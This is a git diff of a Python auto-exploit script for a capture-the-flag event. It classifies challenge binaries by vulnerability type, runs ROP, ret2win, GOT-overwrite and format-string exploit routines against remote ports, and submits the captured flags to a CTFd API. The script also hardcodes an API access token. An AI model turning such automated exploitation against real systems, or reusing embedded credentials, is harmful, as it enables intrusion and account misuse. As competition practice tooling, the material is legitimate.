@@ -1,12 +1,13 @@
 import time
 import json
+import os, subprocess, requests
 
 from dynamic import Dynamic
 from static import Static
 from exploits import Exploits
 
 # this is the function that will detect what exploit to use and call it 
-def handle_exploits(binary):
+def handle_exploits(binary, r=None):
     e = Exploits(binary)
     d = Dynamic()
     s = Static()
@@ -20,7 +21,7 @@ def handle_exploits(binary):
     if printf == "array":
         print("[*] Array abuse detected.")
 
-        flag = e.arrayabuse(binary)
+        flag = e.arrayabuse(binary, _remote=r)
 
         if not flag:
             pass
@@ -32,7 +33,7 @@ def handle_exploits(binary):
         if "pwnme" in e.pwnelf.sym.keys():
             print("[*] Printf write var detected.")
 
-            flag = e.printf_write_var(binary)
+            flag = e.printf_write_var(binary, _remote=r)
 
             if not flag:
                 # kys???
@@ -44,7 +45,7 @@ def handle_exploits(binary):
             print("[*] GOT overwrite detected.")
 
             vuln = json.loads(e.pipe.cmd("pdfj @ sym.vuln"))
-            flag = e.got_overwrite(binary, vuln)
+            flag = e.got_overwrite(binary, vuln, _remote=r)
 
             if not flag:
                 # kys again???
@@ -56,7 +57,7 @@ def handle_exploits(binary):
         # printf read
         print("[*] Printf read var detected")
 
-        flag = e.printf_read_var(binary)
+        flag = e.printf_read_var(binary, _remote=r)
 
         if not flag:
             # angr??
@@ -71,19 +72,19 @@ def handle_exploits(binary):
         vuln = json.loads(e.pipe.cmd("pdfj @ sym.vuln"))
         libc_leak = s.find_given_leaks(vuln)
         
-        flag = e.ret2one(binary, libc_leak)
+        flag = e.ret2one(binary, libc_leak, _remote=r)
 
         if not flag:
             print("[*] Running without a ret")
 
-            flag = e.ret2one(binary, libc_leak, False)
+            flag = e.ret2one(binary, libc_leak, False, _remote=r)
 
             if not flag:
                 print("[*] Trying angr")
-                flag = e.ret2one(binary, libc_leak, False, use_angr=True)
+                flag = e.ret2one(binary, libc_leak, False, use_angr=True, _remote=r)
             
             if not flag:
-                flag = e.ret2one(binary, libc_leak, True, use_angr=True)
+                flag = e.ret2one(binary, libc_leak, True, use_angr=True, _remote=r)
 
         return flag.decode()
 
@@ -91,13 +92,23 @@ def handle_exploits(binary):
     if "win" in e.pwnelf.sym.keys():
         print("[*] ret2win detected")
 
-        flag = e.ret2win(binary)
+        flag = e.ret2win(binary, _remote=r)
+
+        if not flag:
+            print("[*] Adding a ret")
+
+            flag = e.ret2win(binary, add_ret=True, _remote=r)
 
         if not flag:
             # angr
             print("[*] Using angr")
 
-            flag = e.ret2win(binary, use_angr=True)
+            flag = e.ret2win(binary, use_angr=True, _remote=r)
+
+        if not flag:
+            print("[*] Using angr and adding a ret")
+
+            flag = e.ret2win(binary, use_angr=True, add_ret=True, _remote=r)
 
         return flag.decode()
 
@@ -106,13 +117,23 @@ def handle_exploits(binary):
         print("[*] ROP Parameters detected")
 
         constrained_win = json.loads(e.pipe.cmd("pdfj @ sym.constrained_win"))
-        flag = e.rop_parameters(binary, constrained_win)
+        flag = e.rop_parameters(binary, constrained_win, _remote=r)
+
+        if not flag:
+            print("[*] Using a ret")
+
+            flag = e.rop_parameters(binary, constrained_win, add_ret=True, _remote=r)
 
         if not flag:
             # angr
             print("[*] Using angr")
 
-            flag = e.rop_parameters(binary, constrained_win, use_angr=True)
+            flag = e.rop_parameters(binary, constrained_win, use_angr=True, _remote=r)
+
+        if not flag:
+            print("[*] Using angr and a ret")
+
+            flag = e.rop_parameters(binary, constrained_win, use_angr=True, add_ret=True, _remote=r)
 
         return flag.decode()
 
@@ -121,11 +142,11 @@ def handle_exploits(binary):
     if "execve" in e.pwnelf.plt.keys():
         print("[*] ret2execve detected.")
         
-        flag = e.ret2execve(binary)
+        flag = e.ret2execve(binary, _remote=r)
 
         if not flag:
             print("[*] Using angr")
-            flag = e.ret2execve(binary, use_angr=True)
+            flag = e.ret2execve(binary, use_angr=True, _remote=r)
 
         return flag.decode()
     
@@ -147,28 +168,30 @@ def handle_exploits(binary):
     if "system" in e.pwnelf.plt.keys() and binsh:
         print("[*] ret2system detected.")
 
-        flag = e.ret2system(binary)
+        flag = e.ret2system(binary, _remote=r)
 
         if not flag:
             # run without ret and then angr!!
             print("[*] Running without a ret")
 
-            flag = e.ret2system(binary)
+            flag = e.ret2system(binary, _remote=r)
 
-            if not flag:
-                flag = e.ret2system(binary, use_angr=True)
+        if not flag:
+            print("[*] Using angr")
+
+            flag = e.ret2system(binary, use_angr=True, _remote=r)
 
         return flag.decode()
 
     elif "system" in e.pwnelf.plt.keys():
         print("[*] Write gadgets detected.")
 
-        flag = e.write_gadgets(binary)
+        flag = e.write_gadgets(binary, _remote=r)
 
         if not flag:
             print("[*] Trying with a ret")
 
-            flag = e.write_gadgets(binary, add_ret=True)
+            flag = e.write_gadgets(binary, add_ret=True, _remote=r)
 
         if not flag:
             # bruh
@@ -186,22 +209,22 @@ def handle_exploits(binary):
     if syscall:
         print("[*] ret2syscall detected.")
 
-        flag = e.ret2syscall(binary, syscall)
+        flag = e.ret2syscall(binary, syscall, _remote=r)
 
         if not flag:
             print("[*] Shortening ROP chain 1.")
 
-            flag = e.ret2syscall(binary, syscall, 1)
+            flag = e.ret2syscall(binary, syscall, 1, _remote=r)
 
         if not flag:
             print("[*] Shortening ROP chain 2.")
 
-            flag = e.ret2syscall(binary, syscall, 2)
+            flag = e.ret2syscall(binary, syscall, 2, _remote=r)
 
         if not flag:
             print("[*] Shortening ROP chain 3.")
 
-            flag = e.ret2syscall(binary, syscall, 3)
+            flag = e.ret2syscall(binary, syscall, 3, _remote=r)
 
         return flag.decode()
     
@@ -212,9 +235,8 @@ def handle_exploits(binary):
 
 # ================ TESTING GROUNDS ===================
 
-
 def test_category(category):
-    bins = [ f"./ace-student/test-bins/{category}-{i}" for i in range(10) ]
+    bins = [ f"{category}-{i}" for i in range(10) ]
     count = 0
     start = time.time()
     failed = []
@@ -282,9 +304,87 @@ def deep_test():
     print("=========================================")
 
 
-test_category("bin-rop-parameters")
+#test_category("bin-rop-parameters")
 #deep_test()
 
 #flag = handle_exploits("./ace-student/test-bins/bin-ret2win-0")
 #print(flag)
+
+# Access token for team to make api calls -- CHANGE THIS
+access_token = "ctfd_696f91a00fc32938c5ce7238c8328be2bd3d577933baf1b5844d64593a1e22eb"
+
+# URL of ctfd --
+ctfd_url = "https://ctfd.fitsec.monster"
+
+# Headers needed for api calls
+headers = {
+    "Authorization": f"Token {access_token}",
+    "Content-Type" : "application/json",
+}
+
+flag_pattern = r'flag\{[^}]+\}'
+
+# ------------------------------------------------- #
+# This is where your auto exploit code should be    #
+# placed. This should craft the exploit locally to  #
+# get the fake flag, send the exploit to the remote #
+# binary, receive the flag, and submit the flag     #
+# ------------------------------------------------- #
+
+if __name__ == "__main__":
+
+    # ----- Download Binary Repo ----- #
+    while(1):
+        try:
+            subprocess.run("git clone https://github.com/password987654321/ace-student.git", shell=True)
+            os.chdir("ace-student/test-bins") # CHANGE THIS EVENTUALLY
+            break
+        except Exception as e:
+            print("Failed to clone git repo!")
+    # -------------------------------- #
+
+    if not os.path.isfile("./flag.txt"):
+        with open("flag.txt", "w") as f:
+            f.write("flag{your_mom_is_very_beautiful_to_me}")
+
+    # ----- Get the first chal id ---- #
+    challenge_url = f"{ctfd_url}/api/v1/challenges"
+    response = requests.get(challenge_url, headers=headers)
+    json_data = json.loads(response.text).get("data", {})
+    challenge_list = {i["name"]: int(i["id"]) for i in json_data}
+    # -------------------------------- #
+
+    challenge_url = f"{ctfd_url}/api/v1/challenges/attempt"
+
+    filenames = os.listdir()
+    for file in filenames:
+        if ".txt" not in file and ".py" not in file and ".gdb" not in file:
+            if "_patched" not in file:
+                subprocess.run(f"pwninit --bin {file} --libc ../libc.so.6 --ld ../ld-2.27.so --no-template && mv {file}_patched {file}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    
+    # breh
+    port_count = 10000
+    challenges = sorted(os.listdir())
+    flags = []
+
+    for challenge in challenges:
+        if challenge == 'flag.txt':
+            break
+
+        flag = "FLAG"
+        print(f"=============== {challenge}")
+        try:
+            flag = handle_exploits(challenge, ["fitsec.monster", port_count])
+
+        except:
+            pass
+        
+        port_count += 1
+        flags.append(flag)
+    # ----- Main Execution Loop! ----- #
+        data = json.dumps({"challenge_id" : challenge_list[challenge], "submission" : flag})
+        response = requests.post(challenge_url, headers=headers, data=data)
+
+    print(flags)
+    
 
